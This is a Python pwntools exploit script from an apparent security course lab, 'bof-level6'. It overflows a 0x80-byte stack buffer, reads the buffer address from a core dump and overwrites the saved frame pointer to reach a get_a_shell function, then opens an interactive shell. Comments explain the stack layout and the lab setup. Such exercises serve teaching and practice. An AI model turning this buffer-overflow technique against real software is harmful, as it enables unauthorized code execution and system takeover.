#!/usr/bin/env python

from pwn import *

# you may attach gdb with this program (bof-levelx)
p = process('./bof-level6')
#p = process('./bof-level5')

# a setup for automatically opening gdb pane if you are using `tmux`
context.terminal = ['tmux', 'splitw', '-h']
# this will spawn gdb for you (remove this if you do not want gdb)
#gdb.attach(p)


# Please check the binary; read disassembly output from gdb
#
# buffer is at -0x80(%ebp)
# [ buffer size - 0x80 ] [ saved ebp ]
#   'A' * 0x80              'dddd'
# [ 'AAAA' + 'addr of get_a_shell' + 'A' * (0x80-8) ]

# Manual method...
#target_ebp_value = p32(0xffffd3e8)
#addr_of_get_a_shell = p32(0x80484cb)
#buf = "A" * 0x80 + target_ebp_value
#buf = 'AAAA' + addr_of_get_a_shell + 'A' * (0x80 - 8) + target_ebp_value


# A more automatic method
# this will open an ELF object,
e = ELF('./bof-level6')
# and you can find the address of a symbol as follows.
get_a_shell = e.symbols['get_a_shell']

print(hex(get_a_shell))

buf = "A" * 0x88
# for generating core
if not os.path.exists('core'):
    p.sendline(buf)
    p.wait()

c = Core('./core')
"""
In case if you can't get core, then please check your directory.
Core will be generated only if you are under /home/users/* directories
(your home directory). To work on challenges in your home directory
(and also writing some scripts), please use the commend 'fetch' to
get all challenges linked in your directory. e.g.,

    $ fetch week2

this command will fetch all challenges under the directory name 'week2'.

In the worst case (if you still cannot get the core), try the following command
in bash:

    $ ulimit -c unlimited

"""


# we may find the address of buffer from the 'core'
buffer_addr = c.stack.find(buf)
print(hex(buffer_addr))

# construct a new buffer that overwrites saved ebp and then returns to
# get_a_shell().
buf = "AAAAAAAA" + p64(get_a_shell) + "A" * (0x80 - 16) + p64(buffer_addr)

p.sendline(buf)

# enjoy!
p.interactive()